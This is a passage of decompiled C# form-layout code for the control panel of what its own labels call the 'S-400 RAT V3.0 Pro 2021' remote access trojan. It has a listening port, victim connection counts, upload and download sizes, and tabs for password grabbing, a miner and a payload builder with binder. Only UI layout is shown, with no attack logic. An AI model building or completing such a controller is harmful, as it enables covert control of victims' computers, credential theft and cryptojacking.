		RestartToolStripMenuItem1.Size = new Size(135, 38);
		RestartToolStripMenuItem1.Text = "Restart";
		ShowToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		ShowToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ShowToolStripMenuItem.ForeColor = Color.White;
		ShowToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ShowToolStripMenuItem.Image");
		ShowToolStripMenuItem.Name = "ShowToolStripMenuItem";
		ShowToolStripMenuItem.Size = new Size(135, 38);
		ShowToolStripMenuItem.Text = "Show";
		ExitToolStripMenuItem.BackColor = Color.FromArgb(24, 30, 54);
		ExitToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ExitToolStripMenuItem.ForeColor = Color.White;
		ExitToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ExitToolStripMenuItem.Image");
		ExitToolStripMenuItem.Name = "ExitToolStripMenuItem";
		ExitToolStripMenuItem.Size = new Size(135, 38);
		ExitToolStripMenuItem.Text = "Exit";
		vmethod_4().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_4().TargetForm = this;
		vmethod_8().TargetControl = this;
		P1.Controls.Add(Panel6);
		P1.Controls.Add(panel9);
		P1.Controls.Add(panel8);
		P1.Controls.Add(panel4);
		P1.Dock = DockStyle.Fill;
		P1.Location = new Point(0, 0);
		P1.Name = "P1";
		P1.ShadowDecoration.Parent = P1;
		P1.Size = new Size(925, 460);
		P1.TabIndex = 27;
		Panel6.BackColor = Color.FromArgb(37, 42, 64);
		Panel6.Controls.Add(Pp1);
		Panel6.Location = new Point(13, 229);
		Panel6.Name = "Panel6";
		Panel6.Size = new Size(892, 207);
		Panel6.TabIndex = 24;
		Pp1.BackColor = Color.FromArgb(24, 30, 54);
		Pp1.Cursor = Cursors.Hand;
		Pp1.Dock = DockStyle.Fill;
		Pp1.Location = new Point(0, 0);
		Pp1.Name = "Pp1";
		Pp1.Size = new Size(892, 207);
		Pp1.TabIndex = 5;
		Pp1.TabStop = false;
		panel9.BackColor = Color.FromArgb(37, 42, 64);
		panel9.Controls.Add(Label1);
		panel9.Controls.Add(TextBox1);
		panel9.Controls.Add(label16);
		panel9.Location = new Point(13, 144);
		panel9.Name = "panel9";
		panel9.Size = new Size(321, 79);
		panel9.TabIndex = 23;
		Label1.AutoSize = true;
		Label1.Font = new Font("Nirmala UI", 9.75f);
		Label1.ForeColor = Color.White;
		Label1.Location = new Point(216, 9);
		Label1.Name = "Label1";
		Label1.Size = new Size(94, 17);
		Label1.TabIndex = 86;
		Label1.Text = "Not connected";
		TextBox1.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		TextBox1.Animated = true;
		TextBox1.AutoRoundedCorners = true;
		TextBox1.BackColor = Color.FromArgb(46, 51, 73);
		TextBox1.BorderColor = Color.FromArgb(0, 126, 249);
		TextBox1.BorderRadius = 13;
		TextBox1.BorderStyle = DashStyle.Custom;
		TextBox1.Cursor = Cursors.IBeam;
		TextBox1.DefaultText = "4040";
		TextBox1.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		TextBox1.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		TextBox1.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		TextBox1.DisabledState.Parent = TextBox1;
		TextBox1.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		TextBox1.FillColor = Color.FromArgb(37, 42, 64);
		TextBox1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		TextBox1.FocusedState.Parent = TextBox1;
		TextBox1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		TextBox1.ForeColor = Color.White;
		TextBox1.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		TextBox1.HoverState.Parent = TextBox1;
		TextBox1.IconLeft = Resources.disconnected_30px;
		TextBox1.IconLeftCursor = Cursors.Hand;
		TextBox1.Location = new Point(8, 36);
		TextBox1.Margin = new Padding(3, 2, 3, 2);
		TextBox1.Name = "TextBox1";
		TextBox1.PasswordChar = '\0';
		TextBox1.PlaceholderForeColor = Color.Gray;
		TextBox1.PlaceholderText = "Port";
		TextBox1.SelectedText = "";
		TextBox1.SelectionStart = 4;
		TextBox1.ShadowDecoration.Parent = TextBox1;
		TextBox1.Size = new Size(302, 29);
		TextBox1.Style = TextBoxStyle.Material;
		TextBox1.TabIndex = 85;
		TextBox1.TextAlign = HorizontalAlignment.Center;
		label16.AutoSize = true;
		label16.Font = new Font("Nirmala UI", 14.25f);
		label16.ForeColor = Color.White;
		label16.Location = new Point(3, 3);
		label16.Name = "label16";
		label16.Size = new Size(52, 25);
		label16.TabIndex = 0;
		label16.Text = "Port ";
		panel8.BackColor = Color.FromArgb(37, 42, 64);
		panel8.Controls.Add(LEVEL);
		panel8.Controls.Add(SRR);
		panel8.Controls.Add(Ftime);
		panel8.Controls.Add(Flevel);
		panel8.Controls.Add(Fname);
		panel8.Controls.Add(LinkLabel1);
		panel8.Controls.Add(PictureBox20);
		panel8.Controls.Add(Label24);
		panel8.Controls.Add(Label32);
		panel8.Controls.Add(Label18);
		panel8.Controls.Add(Label14);
		panel8.Controls.Add(Label2);
		panel8.Controls.Add(ProgressBar1);
		panel8.Controls.Add(PictureBox21);
		panel8.Controls.Add(PictureBox22);
		panel8.Controls.Add(Label13);
		panel8.Controls.Add(PictureBox19);
		panel8.Location = new Point(340, 8);
		panel8.Name = "panel8";
		panel8.Size = new Size(565, 214);
		panel8.TabIndex = 19;
		LEVEL.CausesValidation = false;
		LEVEL.Location = new Point(52, 94);
		LEVEL.Name = "LEVEL";
		LEVEL.RatingColor = Color.FromArgb(255, 192, 128);
		LEVEL.Size = new Size(77, 18);
		LEVEL.TabIndex = 106;
		LEVEL.TabStop = false;
		SRR.AutoSize = true;
		SRR.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		SRR.ForeColor = Color.Silver;
		SRR.Location = new Point(6, 194);
		SRR.Name = "SRR";
		SRR.Size = new Size(17, 15);
		SRR.TabIndex = 105;
		SRR.Text = "--";
		Ftime.AutoSize = true;
		Ftime.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Ftime.ForeColor = Color.Silver;
		Ftime.Location = new Point(50, 135);
		Ftime.Name = "Ftime";
		Ftime.Size = new Size(17, 15);
		Ftime.TabIndex = 104;
		Ftime.Text = "--";
		Flevel.AutoSize = true;
		Flevel.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Flevel.ForeColor = Color.Silver;
		Flevel.Location = new Point(152, 97);
		Flevel.Name = "Flevel";
		Flevel.Size = new Size(17, 15);
		Flevel.TabIndex = 103;
		Flevel.Text = "--";
		Flevel.Visible = false;
		Fname.AutoSize = true;
		Fname.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Fname.ForeColor = Color.Silver;
		Fname.Location = new Point(50, 59);
		Fname.Name = "Fname";
		Fname.Size = new Size(17, 15);
		Fname.TabIndex = 102;
		Fname.Text = "--";
		LinkLabel1.AutoSize = true;
		LinkLabel1.LinkColor = Color.Silver;
		LinkLabel1.Location = new Point(217, 170);
		LinkLabel1.Name = "LinkLabel1";
		LinkLabel1.Size = new Size(113, 13);
		LinkLabel1.TabIndex = 100;
		LinkLabel1.TabStop = true;
		LinkLabel1.Text = "Dangerous Community";
		PictureBox20.Image = (Image)componentResourceManager.GetObject("PictureBox20.Image");
		PictureBox20.Location = new Point(9, 154);
		PictureBox20.Name = "PictureBox20";
		PictureBox20.Size = new Size(33, 31);
		PictureBox20.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox20.TabIndex = 99;
		PictureBox20.TabStop = false;
		Label24.AutoSize = true;
		Label24.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Label24.ForeColor = Color.Silver;
		Label24.Location = new Point(50, 154);
		Label24.Name = "Label24";
		Label24.Size = new Size(52, 15);
		Label24.TabIndex = 98;
		Label24.Text = "Help me";
		Label32.AutoSize = true;
		Label32.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Label32.ForeColor = Color.Silver;
		Label32.Location = new Point(50, 170);
		Label32.Name = "Label32";
		Label32.Size = new Size(167, 15);
		Label32.TabIndex = 97;
		Label32.Text = "Go to the help team from here";
		Label18.AutoSize = true;
		Label18.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Label18.ForeColor = Color.Silver;
		Label18.Location = new Point(49, 116);
		Label18.Name = "Label18";
		Label18.Size = new Size(65, 15);
		Label18.TabIndex = 96;
		Label18.Text = "Expiry date";
		Label14.AutoSize = true;
		Label14.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Label14.ForeColor = Color.Silver;
		Label14.Location = new Point(50, 77);
		Label14.Name = "Label14";
		Label14.Size = new Size(34, 15);
		Label14.TabIndex = 94;
		Label14.Text = "Level";
		Label2.AutoSize = true;
		Label2.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Label2.ForeColor = Color.Silver;
		Label2.Location = new Point(50, 42);
		Label2.Name = "Label2";
		Label2.Size = new Size(39, 15);
		Label2.TabIndex = 92;
		Label2.Text = "Name";
		ProgressBar1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		ProgressBar1.BackgroundImage = (Image)componentResourceManager.GetObject("ProgressBar1.BackgroundImage");
		ProgressBar1.BackgroundImageLayout = ImageLayout.None;
		ProgressBar1.Font = new Font("Verdana", 8.2f);
		ProgressBar1.ForeColor = Color.FromArgb(139, 152, 166);
		ProgressBar1.Location = new Point(332, 3);
		ProgressBar1.MinimumSize = new Size(30, 30);
		ProgressBar1.Name = "ProgressBar1";
		ProgressBar1.ProgressColor = Color.FromArgb(0, 126, 249);
		ProgressBar1.ProgressColor2 = Color.FromArgb(128, 255, 128);
		ProgressBar1.Size = new Size(233, 233);
		ProgressBar1.TabIndex = 91;
		PictureBox21.Image = (Image)componentResourceManager.GetObject("PictureBox21.Image");
		PictureBox21.Location = new Point(9, 117);
		PictureBox21.Name = "PictureBox21";
		PictureBox21.Size = new Size(32, 31);
		PictureBox21.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox21.TabIndex = 10;
		PictureBox21.TabStop = false;
		PictureBox22.Image = (Image)componentResourceManager.GetObject("PictureBox22.Image");
		PictureBox22.Location = new Point(8, 79);
		PictureBox22.Name = "PictureBox22";
		PictureBox22.Size = new Size(33, 31);
		PictureBox22.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox22.TabIndex = 9;
		PictureBox22.TabStop = false;
		Label13.AutoSize = true;
		Label13.Font = new Font("Nirmala UI", 14.25f);
		Label13.ForeColor = SystemColors.Menu;
		Label13.Location = new Point(4, 7);
		Label13.Name = "Label13";
		Label13.Size = new Size(311, 25);
		Label13.TabIndex = 5;
		Label13.Text = "User info - S-400 RAT V3.0 Pro 2021";
		PictureBox19.Image = (Image)componentResourceManager.GetObject("PictureBox19.Image");
		PictureBox19.Location = new Point(9, 42);
		PictureBox19.Name = "PictureBox19";
		PictureBox19.Size = new Size(33, 31);
		PictureBox19.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox19.TabIndex = 3;
		PictureBox19.TabStop = false;
		panel4.BackColor = Color.FromArgb(37, 42, 64);
		panel4.Controls.Add(PLW);
		panel4.Controls.Add(CO);
		panel4.Controls.Add(label4);
		panel4.Location = new Point(13, 9);
		panel4.Name = "panel4";
		panel4.Size = new Size(321, 129);
		panel4.TabIndex = 21;
		PLW.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		PLW.FillThickness = 10;
		PLW.Image = (Image)componentResourceManager.GetObject("PLW.Image");
		PLW.Location = new Point(203, 11);
		PLW.Name = "PLW";
		PLW.ProgressBrushMode = BrushMode.Solid;
		PLW.ProgressColor = Color.FromArgb(0, 126, 249);
		PLW.ProgressColor2 = Color.FromArgb(0, 192, 0);
		PLW.ProgressEndCap = LineCap.Round;
		PLW.ProgressStartCap = LineCap.Round;
		PLW.ProgressThickness = 10;
		PLW.ShadowDecoration.Mode = ShadowMode.Circle;
		PLW.ShadowDecoration.Parent = PLW;
		PLW.Size = new Size(109, 108);
		PLW.TabIndex = 73;
		PLW.Value = 45;
		CO.AutoSize = true;
		CO.Font = new Font("Microsoft Sans Serif", 21f, FontStyle.Bold);
		CO.ForeColor = Color.FromArgb(33, 191, 203);
		CO.ImageAlign = ContentAlignment.MiddleLeft;
		CO.Location = new Point(23, 45);
		CO.Name = "CO";
		CO.Size = new Size(31, 32);
		CO.TabIndex = 1;
		CO.Text = "0";
		label4.AutoSize = true;
		label4.Font = new Font("Nirmala UI", 14.25f);
		label4.ForeColor = Color.White;
		label4.Location = new Point(12, 7);
		label4.Name = "label4";
		label4.Size = new Size(117, 25);
		label4.TabIndex = 0;
		label4.Text = "Connections";
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BorderColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(1057, 1);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 24;
		vmethod_10().Enabled = true;
		vmethod_10().Interval = 5000;
		vmethod_12().AnimateWindow = true;
		vmethod_12().ContainerControl = this;
		TabControl1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		TabControl1.Controls.Add(A);
		TabControl1.Controls.Add(B);
		TabControl1.Controls.Add(C);
		TabControl1.Controls.Add(D);
		TabControl1.Controls.Add(Passwords);
		TabControl1.Controls.Add(Miner);
		TabControl1.Controls.Add(Grabberff);
		TabControl1.Controls.Add(Logs);
		TabControl1.Controls.Add(Settings);
		TabControl1.Controls.Add(Abouts);
		TabControl1.Location = new Point(180, 78);
		TabControl1.Name = "TabControl1";
		TabControl1.SelectedIndex = 0;
		TabControl1.Size = new Size(933, 486);
		TabControl1.TabIndex = 37;
		TabControl1.Visible = false;
		A.BackColor = Color.FromArgb(46, 51, 73);
		A.Controls.Add(P1);
		A.Location = new Point(4, 22);
		A.Name = "A";
		A.Size = new Size(925, 460);
		A.TabIndex = 0;
		A.Text = "Home";
		B.BackColor = Color.FromArgb(46, 51, 73);
		B.Controls.Add(Panel19);
		B.Controls.Add(Panel18);
		B.Controls.Add(Panel17);
		B.Controls.Add(Panel16);
		B.Controls.Add(L1);
		B.Location = new Point(4, 22);
		B.Name = "B";
		B.Size = new Size(925, 457);
		B.TabIndex = 1;
		B.Text = "Client";
		Panel19.BackColor = Color.FromArgb(37, 42, 64);
		Panel19.Controls.Add(UP);
		Panel19.Controls.Add(PictureBox11);
		Panel19.Controls.Add(Label30);
		Panel19.Location = new Point(9, 8);
		Panel19.Name = "Panel19";
		Panel19.Size = new Size(210, 68);
		Panel19.TabIndex = 55;
		UP.Animated = true;
		UP.AutoRoundedCorners = true;
		UP.BorderRadius = 12;
		UP.CheckedState.Parent = UP;
		UP.CustomImages.Parent = UP;
		UP.FillColor = Color.FromArgb(46, 51, 73);
		UP.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		UP.ForeColor = Color.FromArgb(255, 194, 10);
		UP.HoverState.Parent = UP;
		UP.IndicateFocus = true;
		UP.Location = new Point(13, 30);
		UP.Name = "UP";
		UP.ShadowDecoration.Parent = UP;
		UP.Size = new Size(47, 27);
		UP.TabIndex = 72;
		UP.Text = "0 KB+";
		PictureBox11.Image = (Image)componentResourceManager.GetObject("PictureBox11.Image");
		PictureBox11.Location = new Point(149, 30);
		PictureBox11.Name = "PictureBox11";
		PictureBox11.Size = new Size(49, 27);
		PictureBox11.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox11.TabIndex = 2;
		PictureBox11.TabStop = false;
		Label30.AutoSize = true;
		Label30.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label30.ForeColor = Color.FromArgb(158, 161, 176);
		Label30.Location = new Point(6, 7);
		Label30.Name = "Label30";
		Label30.Size = new Size(191, 16);
		Label30.TabIndex = 0;
		Label30.Text = "The size of the uploaded data";
		Panel18.BackColor = Color.FromArgb(37, 42, 64);
		Panel18.Controls.Add(Label3);
		Panel18.Controls.Add(PictureBox10);
		Panel18.Controls.Add(Label29);
		Panel18.Location = new Point(225, 8);
		Panel18.Name = "Panel18";
		Panel18.Size = new Size(218, 68);
		Panel18.TabIndex = 54;
		Label3.Animated = true;
		Label3.AutoRoundedCorners = true;
		Label3.BorderRadius = 12;
		Label3.CheckedState.Parent = Label3;
		Label3.CustomImages.Parent = Label3;
		Label3.FillColor = Color.FromArgb(46, 51, 73);
		Label3.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Label3.ForeColor = Color.FromArgb(255, 194, 10);
		Label3.HoverState.Parent = Label3;
		Label3.IndicateFocus = true;
		Label3.Location = new Point(13, 30);
		Label3.Name = "Label3";
		Label3.ShadowDecoration.Parent = Label3;
		Label3.Size = new Size(47, 27);
		Label3.TabIndex = 72;
		Label3.Text = "0 KB+";
		PictureBox10.Image = (Image)componentResourceManager.GetObject("PictureBox10.Image");
		PictureBox10.Location = new Point(160, 30);
		PictureBox10.Name = "PictureBox10";
		PictureBox10.Size = new Size(49, 27);
		PictureBox10.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox10.TabIndex = 2;
		PictureBox10.TabStop = false;
		Label29.AutoSize = true;
		Label29.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label29.ForeColor = Color.FromArgb(158, 161, 176);
		Label29.Location = new Point(6, 7);
		Label29.Name = "Label29";
		Label29.Size = new Size(196, 16);
		Label29.TabIndex = 0;
		Label29.Text = "The size of the Download data";
		Panel17.BackColor = Color.FromArgb(37, 42, 64);
		Panel17.Controls.Add(Sel);
		Panel17.Controls.Add(PictureBox9);
		Panel17.Controls.Add(Label20);
		Panel17.Location = new Point(688, 8);
		Panel17.Name = "Panel17";
		Panel17.Size = new Size(218, 68);
		Panel17.TabIndex = 53;
		Sel.Animated = true;
		Sel.AutoRoundedCorners = true;
		Sel.BorderRadius = 12;
		Sel.CheckedState.Parent = Sel;
		Sel.CustomImages.Parent = Sel;
		Sel.FillColor = Color.FromArgb(46, 51, 73);
		Sel.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Sel.ForeColor = Color.FromArgb(255, 194, 10);
		Sel.HoverState.Parent = Sel;
		Sel.IndicateFocus = true;
		Sel.Location = new Point(9, 30);
		Sel.Name = "Sel";
		Sel.ShadowDecoration.Parent = Sel;
		Sel.Size = new Size(47, 27);
		Sel.TabIndex = 72;
		Sel.Text = "0 PC+";
		PictureBox9.Image = (Image)componentResourceManager.GetObject("PictureBox9.Image");
		PictureBox9.Location = new Point(160, 30);
		PictureBox9.Name = "PictureBox9";
		PictureBox9.Size = new Size(49, 27);
		PictureBox9.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox9.TabIndex = 2;
		PictureBox9.TabStop = false;
		Label20.AutoSize = true;
		Label20.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label20.ForeColor = Color.FromArgb(158, 161, 176);
		Label20.Location = new Point(6, 7);
		Label20.Name = "Label20";
		Label20.Size = new Size(202, 16);
		Label20.TabIndex = 0;
		Label20.Text = "The number of devices selected";
		Panel16.BackColor = Color.FromArgb(37, 42, 64);
		Panel16.Controls.Add(PictureBox7);
		Panel16.Controls.Add(Onl);
		Panel16.Controls.Add(Label26);
		Panel16.Location = new Point(449, 8);
		Panel16.Name = "Panel16";
		Panel16.Size = new Size(233, 68);
		Panel16.TabIndex = 52;
		PictureBox7.Image = (Image)componentResourceManager.GetObject("PictureBox7.Image");
		PictureBox7.Location = new Point(178, 30);
		PictureBox7.Name = "PictureBox7";
		PictureBox7.Size = new Size(49, 27);
		PictureBox7.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox7.TabIndex = 2;
		PictureBox7.TabStop = false;
		Onl.Animated = true;
		Onl.AutoRoundedCorners = true;
		Onl.BorderRadius = 12;
		Onl.CheckedState.Parent = Onl;
		Onl.CustomImages.Parent = Onl;
		Onl.FillColor = Color.FromArgb(46, 51, 73);
		Onl.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Onl.ForeColor = Color.FromArgb(255, 194, 10);
		Onl.HoverState.Parent = Onl;
		Onl.IndicateFocus = true;
		Onl.Location = new Point(9, 30);
		Onl.Name = "Onl";
		Onl.ShadowDecoration.Parent = Onl;
		Onl.Size = new Size(64, 27);
		Onl.TabIndex = 72;
		Onl.Text = "0 Online";
		Label26.AutoSize = true;
		Label26.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label26.ForeColor = Color.FromArgb(158, 161, 176);
		Label26.Location = new Point(6, 7);
		Label26.Name = "Label26";
		Label26.Size = new Size(220, 16);
		Label26.TabIndex = 0;
		Label26.Text = "Number of devices connected now";
		L1.AllowUserToAddRows = false;
		L1.AllowUserToDeleteRows = false;
		dataGridViewCellStyle.BackColor = Color.FromArgb(24, 30, 54);
		dataGridViewCellStyle.ForeColor = Color.White;
		dataGridViewCellStyle.SelectionBackColor = Color.FromArgb(0, 122, 204);
		dataGridViewCellStyle.SelectionForeColor = Color.Black;
		L1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		L1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		L1.BackgroundColor = Color.FromArgb(37, 42, 64);
		L1.BorderStyle = BorderStyle.None;
		L1.CellBorderStyle = DataGridViewCellBorderStyle.None;
		L1.ClipboardCopyMode = DataGridViewClipboardCopyMode.Disable;
		L1.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = Color.FromArgb(0, 73, 138);
		dataGridViewCellStyle2.Font = new Font("Arial", 8f, FontStyle.Bold);
		dataGridViewCellStyle2.ForeColor = Color.White;
		dataGridViewCellStyle2.SelectionBackColor = Color.FromArgb(255, 111, 11);
		dataGridViewCellStyle2.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = DataGridViewTriState.True;
		L1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		L1.ColumnHeadersHeight = 38;
		L1.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		L1.ContextMenuStrip = ContextMenuStrip1;
		dataGridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = Color.FromArgb(39, 55, 82);
		dataGridViewCellStyle3.Font = new Font("Arial", 8f, FontStyle.Bold);
		dataGridViewCellStyle3.ForeColor = Color.White;
		dataGridViewCellStyle3.SelectionBackColor = Color.FromArgb(0, 122, 204);
		dataGridViewCellStyle3.SelectionForeColor = Color.Black;
		dataGridViewCellStyle3.WrapMode = DataGridViewTriState.False;
		L1.DefaultCellStyle = dataGridViewCellStyle3;
		L1.EnableHeadersVisualStyles = false;
		L1.Font = new Font("Arial", 8f, FontStyle.Bold);
		L1.GridColor = Color.FromArgb(37, 42, 64);
		L1.Location = new Point(9, 82);
		L1.Name = "L1";
		L1.ReadOnly = true;
		L1.RowHeadersVisible = false;
		L1.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		L1.ShowCellErrors = false;
		L1.ShowEditingIcon = false;
		L1.ShowRowErrors = false;
		L1.Size = new Size(902, 354);
		L1.TabIndex = 3;
		C.BackColor = Color.FromArgb(46, 51, 73);
		C.Controls.Add(Guna2GradientPanel4);
		C.Controls.Add(Guna2GradientPanel3);
		C.Controls.Add(Guna2GradientPanel2);
		C.Controls.Add(Guna2GradientPanel1);
		C.Controls.Add(TabControl2);
		C.ForeColor = Color.Transparent;
		C.Location = new Point(4, 22);
		C.Name = "C";
		C.Size = new Size(925, 457);
		C.TabIndex = 2;
		C.Text = "Builder";
		Guna2GradientPanel4.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Guna2GradientPanel4.BackColor = Color.FromArgb(37, 42, 64);
		Guna2GradientPanel4.Controls.Add(Button7);
		Guna2GradientPanel4.Controls.Add(Button6);
		Guna2GradientPanel4.Controls.Add(Button5);
		Guna2GradientPanel4.Controls.Add(Button4);
		Guna2GradientPanel4.Controls.Add(Button3);
		Guna2GradientPanel4.Controls.Add(Button2);
		Guna2GradientPanel4.Controls.Add(Button1);
		Guna2GradientPanel4.Location = new Point(0, 2);
		Guna2GradientPanel4.Name = "Guna2GradientPanel4";
		Guna2GradientPanel4.ShadowDecoration.Parent = Guna2GradientPanel4;
		Guna2GradientPanel4.Size = new Size(929, 40);
		Guna2GradientPanel4.TabIndex = 39;
		Button7.Dock = DockStyle.Left;
		Button7.FlatAppearance.BorderSize = 0;
		Button7.FlatStyle = FlatStyle.Flat;
		Button7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button7.ForeColor = Color.White;
		Button7.Image = (Image)componentResourceManager.GetObject("Button7.Image");
		Button7.Location = new Point(792, 0);
		Button7.Name = "Button7";
		Button7.Size = new Size(121, 40);
		Button7.TabIndex = 8;
		Button7.Text = "Build";
		Button7.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button7.UseVisualStyleBackColor = true;
		Button6.Dock = DockStyle.Left;
		Button6.FlatAppearance.BorderSize = 0;
		Button6.FlatStyle = FlatStyle.Flat;
		Button6.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button6.ForeColor = Color.White;
		Button6.Image = (Image)componentResourceManager.GetObject("Button6.Image");
		Button6.Location = new Point(660, 0);
		Button6.Name = "Button6";
		Button6.Size = new Size(132, 40);
		Button6.TabIndex = 7;
		Button6.Text = "Assembly";
		Button6.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button6.UseVisualStyleBackColor = true;
		Button5.Dock = DockStyle.Left;
		Button5.FlatAppearance.BorderSize = 0;
		Button5.FlatStyle = FlatStyle.Flat;
		Button5.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button5.ForeColor = Color.White;
		Button5.Image = (Image)componentResourceManager.GetObject("Button5.Image");
		Button5.Location = new Point(528, 0);
		Button5.Name = "Button5";
		Button5.Size = new Size(132, 40);
		Button5.TabIndex = 6;
		Button5.Text = "Binder";
		Button5.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button5.UseVisualStyleBackColor = true;
		Button4.Dock = DockStyle.Left;
		Button4.FlatAppearance.BorderSize = 0;
		Button4.FlatStyle = FlatStyle.Flat;
		Button4.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button4.ForeColor = Color.White;
		Button4.Image = (Image)componentResourceManager.GetObject("Button4.Image");
		Button4.Location = new Point(396, 0);
		Button4.Name = "Button4";
		Button4.Size = new Size(132, 40);
		Button4.TabIndex = 5;
		Button4.Text = "Miner";
		Button4.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button4.UseVisualStyleBackColor = true;
		Button3.Dock = DockStyle.Left;
		Button3.FlatAppearance.BorderSize = 0;
		Button3.FlatStyle = FlatStyle.Flat;
		Button3.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button3.ForeColor = Color.White;
		Button3.Image = (Image)componentResourceManager.GetObject("Button3.Image");
		Button3.Location = new Point(264, 0);
		Button3.Name = "Button3";
		Button3.Size = new Size(132, 40);
		Button3.TabIndex = 4;
		Button3.Text = "Security";
		Button3.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button3.UseVisualStyleBackColor = true;
		Button2.Dock = DockStyle.Left;
		Button2.FlatAppearance.BorderSize = 0;
		Button2.FlatStyle = FlatStyle.Flat;
		Button2.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button2.ForeColor = Color.White;
		Button2.Image = (Image)componentResourceManager.GetObject("Button2.Image");
		Button2.Location = new Point(132, 0);
		Button2.Name = "Button2";
		Button2.Size = new Size(132, 40);
		Button2.TabIndex = 3;
		Button2.Text = "Install";
		Button2.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button2.UseVisualStyleBackColor = true;
		Button1.Dock = DockStyle.Left;
		Button1.FlatAppearance.BorderSize = 0;
		Button1.FlatStyle = FlatStyle.Flat;
		Button1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button1.ForeColor = Color.White;
		Button1.Image = (Image)componentResourceManager.GetObject("Button1.Image");
		Button1.Location = new Point(0, 0);
		Button1.Name = "Button1";
		Button1.Size = new Size(132, 40);
		Button1.TabIndex = 2;
		Button1.Text = "Connection";
		Button1.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button1.UseVisualStyleBackColor = true;
		Guna2GradientPanel3.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Guna2GradientPanel3.Location = new Point(8, 552);
		Guna2GradientPanel3.Name = "Guna2GradientPanel3";
		Guna2GradientPanel3.ShadowDecoration.Parent = Guna2GradientPanel3;
		Guna2GradientPanel3.Size = new Size(912, 15);
		Guna2GradientPanel3.TabIndex = 136;
		Guna2GradientPanel2.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Right;
		Guna2GradientPanel2.Location = new Point(905, 39);
		Guna2GradientPanel2.Name = "Guna2GradientPanel2";
